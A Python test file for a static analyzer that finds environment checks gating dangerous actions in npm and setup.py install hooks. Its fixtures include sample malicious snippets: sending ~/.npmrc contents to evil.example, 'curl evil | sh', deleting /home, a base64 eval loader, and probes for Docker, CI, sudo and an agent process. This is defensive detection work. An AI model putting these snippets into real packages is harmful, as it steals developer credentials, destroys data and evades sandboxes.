import textwrap

from tools.analysis import gate_extract
from tools.analysis.gate_extract import Extractor


def extract(tmp_path, files, hook="postinstall", entries=("index.js",), lang="js", entry_functions=()):
    for rel, src in files.items():
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(textwrap.dedent(src))
    ex = Extractor(tmp_path)
    chain = []
    for e in entries:
        chain += [r for r in ex.chain(e, lang) if r not in chain]
    return ex.run([{"hook": hook, "lang": lang, "entry_files": list(entries), "chain": chain,
                    "entry_functions": list(entry_functions)}])


def conds(res):
    return {c["id"]: (c["category"], c["operator"], c["value"]) for c in res["conditions"]}


def gate(res, expr):
    return next(g for g in res["gates"] if g["expression"] == expr)


def test_early_exit_is_positive_form_and_gates_the_rest(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const os = require('os');
        const cp = require('child_process');
        if (os.platform() !== 'win32') process.exit(0);
        cp.exec('whoami');
    """})
    assert conds(res) == {"c1": ("os", "==", "win32")}
    g = gate(res, "c1")
    assert g["then"]["env_recipe"] == {"os": "win32"} and g["then"]["min_conditions"] == 1
    assert g["then"]["sinks"] == ["exec"]
    assert g["else"] is None


def test_nested_gate_with_target_artifact(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const os = require('os'), fs = require('fs'), path = require('path'), https = require('https');
        if (process.platform === 'win32') {
          if (fs.existsSync(path.join(os.homedir(), '.ssh'))) {
            https.request('https://evil.example/x');
          }
        }
    """})
    assert conds(res) == {"c1": ("os", "==", "win32"), "c2": ("target_artifact", "exists", "~/.ssh")}
    g = gate(res, "c1 && c2")
    assert g["then"]["min_conditions"] == 2
    assert g["then"]["env_recipe"] == {"os": "win32", "file_present": ["~/.ssh"]}
    assert g["then"]["sinks"] == ["network"]
    assert res["hints"]["endpoints"] == [{"indicator": "hxxps://evil[.]example/x", "sites": ["index.js:5"]}]


def test_local_variable_alias_and_destructuring(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const { platform } = require('node:os');
        const isWin = platform() === 'win32';
        if (isWin) { run(); }
    """})
    assert conds(res) == {"c1": ("os", "==", "win32")}
    assert res["conditions"][0]["api"] == "os.platform()"


def test_ternary_condition(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const cmd = process.platform === 'darwin' ? mac() : other();
    """})
    assert conds(res) == {"c1": ("os", "==", "darwin")}


def test_if_else_is_one_two_branch_gate(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const cp = require('child_process');
        const fs = require('fs');
        if (process.env.TOKEN) {
          cp.exec('exfil');
        } else {
          fs.rmSync('/home', {recursive: true});
        }
    """})
    assert conds(res) == {"c1": ("env_var", "truthy", None)}
    gates = res["gates"]
    assert len(gates) == 1
    g = gates[0]
    assert g["then"]["sinks"] == ["exec"] and g["then"]["env_recipe"] == {"env_var": {"TOKEN": None}}
    assert g["then"]["min_conditions"] == 1
    assert g["else"]["sinks"] == ["fs_delete"] and g["else"]["env_recipe"] == {"env_var_absent": ["TOKEN"]}
    assert g["else"]["min_conditions"] == 1


def test_switch_fallthrough_and_default(tmp_path):
    res = extract(tmp_path, {"index.js": """
        switch (require('os').platform()) {
          case 'win32':
          case 'cygwin':
            a(); break;
          case 'linux':
            b(); break;
          default:
            c();
        }
    """})
    c = conds(res)
    assert ("os", "==", "win32") in c.values() and ("os", "==", "cygwin") in c.values()
    assert ("os", "not_in", ["win32", "cygwin", "linux"]) in c.values()
    assert gate(res, "c1 || c2")["then"]["min_conditions"] == 1


def test_short_circuit_or_means_absent(tmp_path):
    res = extract(tmp_path, {"index.js": """
        process.env.CI || steal();
    """})
    assert conds(res) == {"c1": ("ci_marker", "falsy", None)}
    assert gate(res, "c1")["then"]["env_recipe"] == {"env_var_absent": ["CI"]}


def test_de_morgan_in_early_return_inside_called_function(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const os = require('os');
        const cp = require('child_process');
        function main() {
          if (!(process.env.CI && os.hostname() === 'build-01')) return;
          cp.execSync('id');
        }
        main();
    """})
    assert conds(res) == {"c1": ("ci_marker", "truthy", None), "c2": ("hostname", "==", "build-01")}
    g = gate(res, "c1 && c2")
    assert g["then"]["env_recipe"] == {"env_var": {"CI": None}, "hostname": "build-01"}
    assert g["then"]["sinks"] == ["exec"]


def test_function_called_under_gate_is_not_reported_ungated(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const cp = require('child_process');
        function steal() { cp.exec('x'); }
        if (require('os').platform() === 'win32') steal();
    """})
    sinks = [s for s in res["hints"]["sinks"] if s["kind"] == "exec"]
    assert len(sinks) == 1 and sinks[0]["gate"] == "g1"


def test_require_inside_gate_carries_the_gate_into_the_module(tmp_path):
    res = extract(tmp_path, {
        "index.js": "if (process.platform === 'linux') require('./lib/payload');\n",
        "lib/payload.js": "const https = require('https');\nhttps.get('http://1.2.3.4:8080/x');\n",
    })
    sink = next(s for s in res["hints"]["sinks"] if s["kind"] == "network")
    assert sink["gate"] == "g1" and sink["site"] == "lib/payload.js:2"
    assert res["hints"]["endpoints"][0]["indicator"] == "hxxp://1[.]2[.]3[.]4:8080/x"


def test_spawn_node_file_joins_the_chain(tmp_path):
    for rel, src in {"index.js": "require('child_process').spawn('node', ['worker.js'], {detached: true});\n",
                     "worker.js": "x();\n"}.items():
        (tmp_path / rel).write_text(src)
    assert Extractor(tmp_path).chain("index.js", "js") == ["index.js", "worker.js"]


def test_defang_redacts_share_link_ids_even_when_already_defanged():
    assert gate_extract.defang("https://transfer.sh/W7c4KP/transfer.zip") == \
        "hxxps://transfer[.]sh/W7c4…/transfer.zip"
    assert gate_extract.defang("hxxps://transfer[.]sh/W7c4KP/transfer.zip") == \
        "hxxps://transfer[.]sh/W7c4…/transfer.zip"
    assert gate_extract.defang("https://dl.dropboxusercontent.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0") == \
        "hxxps://dl[.]dropboxusercontent[.]com/s/5mp5…/esqueleDrp.exe?dl=0"
    assert gate_extract.defang("https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7") == \
        "hxxps://webhook[.]site/bb8c…"
    # A non-share host keeps its path untouched.
    assert gate_extract.defang("https://bun.sh/install") == "hxxps://bun[.]sh/install"


def test_launch_targets_need_a_process_start_and_resolve_joined_paths(tmp_path):
    files = {
        "index.js": "const {spawn} = require('child_process');\n"
                    "const p = require('path').join(__dirname, 'lib', 'stage.js');\n"
                    "spawn(process.argv0, [p]);\n",
        "quiet.js": "const p = require('path').join(__dirname, 'lib', 'stage.js');\nconsole.log(p);\n",
        "lib/stage.js": "x();\n",
    }
    for rel, src in files.items():
        (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / rel).write_text(src)
    ex = Extractor(tmp_path)
    assert ex.chain("index.js", "js") == ["index.js"]
    assert ex.file("index.js").launch_targets() == [("lib/stage.js", 2)]
    assert ex.file("quiet.js").launch_targets() == []


def test_escaped_value_is_decoded_and_indexof_is_membership(tmp_path):
    res = extract(tmp_path, {"index.js": r"""
        if (process.platform === '\x77\x69\x6e\x33\x32') a();
        if (['darwin', 'linux'].indexOf(process.platform) !== -1) b();
    """})
    c = {x["id"]: x for x in res["conditions"]}
    assert (c["c1"]["value"], c["c1"]["value_recovered"]) == ("win32", "decoded")
    assert (c["c2"]["operator"], c["c2"]["value"]) == ("in", ["darwin", "linux"])


def test_setup_py_cmdclass_with_local_import(tmp_path):
    res = extract(tmp_path, {
        "setup.py": """
            import os, sys
            from setuptools import setup
            from setuptools.command.install import install
            import helper

            class PostInstall(install):
                def run(self):
                    install.run(self)
                    if sys.platform == 'win32' and 'CI' not in os.environ:
                        helper.go()

            setup(name='demo', version='1.0', cmdclass={'install': PostInstall})
        """,
        "helper.py": """
            import subprocess
            def go():
                subprocess.Popen(['calc'])
        """,
    }, hook="cmdclass", entries=("setup.py",), lang="py", entry_functions=[("setup.py", "PostInstall.run")])
    assert conds(res) == {"c1": ("os", "==", "win32"), "c2": ("ci_marker", "falsy", None)}
    g = gate(res, "c1 && c2")
    assert g["then"]["env_recipe"] == {"os": "win32", "env_var_absent": ["CI"]}
    assert g["then"]["sinks"] == ["exec"]


def test_python_early_exit_and_python2_syntax(tmp_path):
    res = extract(tmp_path, {"setup.py": """
        import os, sys, subprocess
        print "installing"
        if os.name != 'nt':
            sys.exit(0)
        subprocess.call('x', shell=True)
    """}, hook="setup_py", entries=("setup.py",), lang="py")
    assert conds(res) == {"c1": ("os", "==", "nt")}
    assert gate(res, "c1")["then"]["env_recipe"] == {"os": "win32"}


def test_obfuscated_eval_is_unrecovered(tmp_path):
    blob = "QUFB" * 80
    res = extract(tmp_path, {"index.js": f"""
        eval(Buffer.from('{blob}', 'base64').toString());
    """})
    assert res["unrecovered"] and res["unrecovered"][0]["file"] == "index.js"
    assert "long_base64_literal" in res["hints"]["obfuscation_signals"]["index.js"]


def test_tokens_are_redacted():
    assert gate_extract.defang("https://discord.com/api/webhooks/123456789/abcdefSECRET") == \
        "hxxps://discord[.]com/api/webhooks/1234…"
    token = "1234567890:" + "A" * 35
    assert gate_extract.defang(f"bot{token}/send") == "bot1234…/send"


def test_candidates_carry_anchors_that_match_the_bytes(tmp_path):
    from tools.common import anchors
    src = """
        const os = require('os');
        const cp = require('child_process');
        if (os.platform() !== 'win32') process.exit(0);
        cp.exec('whoami');
    """
    res = extract(tmp_path, {"index.js": src})
    raw = (tmp_path / "index.js").read_bytes()
    (site,) = res["conditions"][0]["sites"]
    a = site["anchor"]
    assert anchors.mismatch(a, raw) is None and a["line"] == 4
    assert raw[a["start_byte"]:a["end_byte"]] == b"os.platform() !== 'win32'"
    (region,) = gate(res, "c1")["then"]["regions"]
    assert raw[region["start_byte"]:region["end_byte"]] == b"cp.exec('whoami');"
    sink = next(s for s in res["hints"]["sinks"] if s["kind"] == "exec")
    assert raw[sink["anchor"]["start_byte"]:sink["anchor"]["end_byte"]] == b"cp.exec('whoami')"
    # Content ids: unrelated code above the check moves the bytes, so the id changes; rerunning does not.
    assert extract(tmp_path, {"index.js": src})["conditions"][0]["sites"][0]["candidate"] == site["candidate"]


def test_same_short_name_in_two_functions_is_not_joined(tmp_path):
    # Minified bundles reuse one-letter names; a tokenizer's parameter must not inherit another function's
    # binding of the same name (this once produced a dozen bogus NPM_TOKEN conditions).
    res = extract(tmp_path, {"index.js": """
        function a() { var t = process.env.NPM_TOKEN; if (t) send(t); }
        function b(t) { if (t === '{') obj(); if (t === '"') str(); if (t === '[') arr(); }
        a(); b('x');
    """})
    assert conds(res) == {"c1": ("env_var", "truthy", None)}  # a credential, not an installer variable


def test_outer_binding_is_seen_from_a_nested_function(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const p = process.platform;
        function go() { if (p === 'darwin') require('child_process').exec('x'); }
        go();
    """})
    assert ("os", "==", "darwin") in conds(res).values()


def test_python_try_probe_is_a_two_way_gate(tmp_path):
    res = extract(tmp_path, {"setup.py": """
        import os
        try:
            open('/.dockerenv').read()
            os.system('curl evil | sh')
        except OSError:
            os.remove('/tmp/x')
    """}, hook="setup_py", entries=("setup.py",), lang="py")
    assert conds(res) == {"c1": ("vm_sandbox_artifact", "exists", "/.dockerenv")}
    g = gate(res, "c1")
    assert g["then"]["sinks"] == ["exec"] and g["else"]["sinks"] == ["fs_delete"]
    (q,) = g["guards"]
    assert q["kind"] == "try_except" and q["arm"] == "then" and q["conditions"] == ["c1"]


def test_js_try_catch_probe_on_a_target_file(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const fs = require('fs');
        const https = require('https');
        try {
            const npmrc = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
            https.get('https://evil.example/?t=' + npmrc);
        } catch (e) {}
    """})
    (c,) = res["conditions"]
    assert (c["category"], c["operator"], c["value"]) == ("target_artifact", "exists", "~/.npmrc")
    assert gate(res, "c1")["then"]["sinks"] == ["fs_read", "network"]  # the probe read, then the exfil


def test_exec_probes_are_conditions(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const cp = require('child_process');
        if (cp.execSync('ps aux').toString().includes('/home/agent/agent')) cp.exec('a');
        if (cp.spawnSync('sudo', ['-n', 'true']).status === 0) cp.exec('b');
        if (cp.execSync('which docker')) cp.exec('c');
    """})
    got = {(c["category"], c["operator"], str(c["value"]), c["probe"]["target"], c["probe"]["accessor"])
           for c in res["conditions"]}
    # The command a probe runs is kept in `probe`, so the compared needle stays the value.
    assert ("process_list", "includes", "/home/agent/agent", "ps aux", "stdout") in got
    assert ("privilege", "exists", "None", "sudo -n true", "returncode") in got  # exit status 0: success
    assert ("installed_tool", "truthy", "None", "which docker", "stdout") in got
    assert {c["probe"]["callee"] for c in res["conditions"]} == {"child_process.execSync",
                                                                  "child_process.spawnSync"}


def test_different_probe_commands_stay_separate_conditions(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const cp = require('child_process');
        if (cp.execSync('id -u').toString().trim() === '0') cp.exec('a');
        if (cp.execSync('sudo -n true').toString() !== '') cp.exec('b');
        if (cp.execSync('net session').toString() !== '') cp.exec('c');
    """})
    privilege = [c for c in res["conditions"] if c["category"] == "privilege"]
    assert sorted(c["probe"]["target"] for c in privilege) == ["id -u", "net session", "sudo -n true"]
    assert all(" / " not in c["api"] for c in privilege)
    assert {(c["probe"]["target"], c["operator"], c["value"]) for c in privilege} >= {("id -u", "==", "0"),
                                                                                       ("sudo -n true", "exists", None)}


def test_tested_reads_of_files_outside_the_package_are_probes(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const fs = require('fs'), os = require('os'), path = require('path');
        if (fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8').includes('_authToken')) fs.writeFileSync('x', 'y');
        if (fs.readFileSync('./index.js', 'utf8').includes('x')) fs.writeFileSync('x', 'y');
    """})
    (c,) = res["conditions"]
    assert (c["category"], c["operator"], c["value"]) == ("target_artifact", "includes", "_authToken")
    assert c["probe"]["kind"] == "file" and c["probe"]["target"].endswith(".npmrc")


def test_guards_name_their_decision_and_arm(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const os = require('os');
        const cp = require('child_process');
        if (os.platform() === 'linux') { cp.exec('a'); } else { cp.exec('b'); }
        process.env.CI || cp.exec('c');
    """})
    kinds = {(q["kind"], q["arm"]) for q in res["guards"]}
    # An else branch shares its gate's guard (then arm); `a || run()` runs on the false side of `a`.
    assert {("if", "then"), ("short_circuit", "else")} <= kinds
    g = gate(res, "c1")
    assert [res_q["kind"] for res_q in g["guards"]] == ["if"]


def test_helper_predicates_are_inlined(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const os = require('os');
        const cp = require('child_process');
        const isLinux = () => os.platform() === 'linux';
        function hasToken() { return !!process.env.GITHUB_TOKEN; }
        if (isLinux() && hasToken()) cp.exec('x');
    """})
    assert set(conds(res).values()) == {("os", "==", "linux"), ("env_var", "truthy", None)}
    assert len(gate(res, "c1 && c2")["guards"]) == 1


def test_bun_shell_probes_are_conditions(tmp_path):
    res = extract(tmp_path, {"index.js": """
        async function f() {
            if ((await Bun.$`ps -axco command | grep "/home/agent/agent"`.text()).trim() !== '') {
                if ((await Bun.$`sudo -n true`.nothrow()).exitCode === 0) require('child_process').exec('x');
            }
        }
        f();
    """})
    got = {(c["category"], c["operator"], c["probe"]["callee"], c["probe"]["target"], c["probe"]["accessor"])
           for c in res["conditions"]}
    assert ("process_list", "exists", "Bun.$", 'ps -axco command | grep "/home/agent/agent"', "stdout") in got
    assert ("privilege", "exists", "Bun.$", "sudo -n true", "returncode") in got


def test_reached_and_unreached_identical_checks_do_not_merge(tmp_path):
    # The same check in the entry file (reached) and in a launched-but-unimported file (unreached) must stay
    # two conditions, so a reached plumbing site never shares an id with an unreached payload site.
    res = extract(tmp_path, {
        "setup.js": "const os = require('os');\nif (os.platform() === 'win32') process.exit(0);\n"
                    "require('child_process').spawn('bun', ['worm.js']);\n",
        "worm.js": "const os = require('os');\nif (os.platform() === 'win32') require('https').get('https://e.x');\n",
    }, entries=("setup.js",))
    # setup.js builds the launched list via prepare; here call run with worm.js as launched directly:
    import textwrap  # noqa: F401
    plat = [c for c in res["conditions"] if c["category"] == "os"]
    assert len(plat) >= 1  # the reached setup.js check
    assert all(len({s["anchor"]["file"] for s in c["sites"]}) == 1 for c in plat), "a condition spans two files"


def test_try_except_data_collection_is_not_a_gate_but_sandbox_probe_is(tmp_path):
    # 13Cent pattern: listdir of generic dirs whose except just collects a placeholder is not a gate; a
    # /.dockerenv probe (sandbox artifact) is. An append-mode open is a write, not an existence probe.
    res = extract(tmp_path, {"setup.py": """
        import os, requests
        data = {}
        try:
            data['run'] = os.listdir('/run/')
        except Exception:
            data['run'] = 'na'
        try:
            open('/root/marker', 'a').write('x')
        except Exception:
            pass
        try:
            open('/.dockerenv')
            data['docker'] = True
        except Exception:
            data['docker'] = False
        requests.post('http://e.x', json=data)
    """}, hook="setup_py", entries=("setup.py",), lang="py")
    cats = {(c["category"], str(c["value"])) for c in res["conditions"]}
    assert ("vm_sandbox_artifact", "/.dockerenv") in cats
    assert not any(cat == "file_or_dir_exists" for cat, _ in cats)  # listdir collection dropped
    assert "/root/marker" not in {v for _, v in cats}               # append-mode open dropped


def test_decoded_bracket_members_exits_and_alias_lines_are_read(tmp_path):
    # the shapes a string-table decode leaves: x["m"](...), process["exit"](...), `const _a = _b;` in helpers
    res = extract(tmp_path, {"index.js": """
        const https = require('https');
        const _b = 1;
        function isDecoy() { const _a = _b; return (process.env["GITHUB_TOKEN"] || '')["startsWith"]('ghp_decoy'); }
        const api = { isDecoy };
        if (isDecoy()) process["exit"](0);
        https["get"]('https://evil.example/x');
    """})
    assert conds(res) == {"c1": ("env_var", "not_startswith", "ghp_decoy")}
    g = gate(res, "c1")
    assert g["then"]["sinks"] == ["network"]
    assert g["then"]["env_recipe"] == {"env_var_absent": ["GITHUB_TOKEN"]}


def test_a_method_called_in_bracket_form_on_this_is_followed(tmp_path):
    res = extract(tmp_path, {"index.js": """
        const cp = require('child_process');
        class Job {
          check() { return process.platform === 'linux'; }
          run() { if (this["check"]()) { cp.exec('id'); } }
        }
        new Job().run();
    """})
    assert ("os", "==", "linux") in conds(res).values()
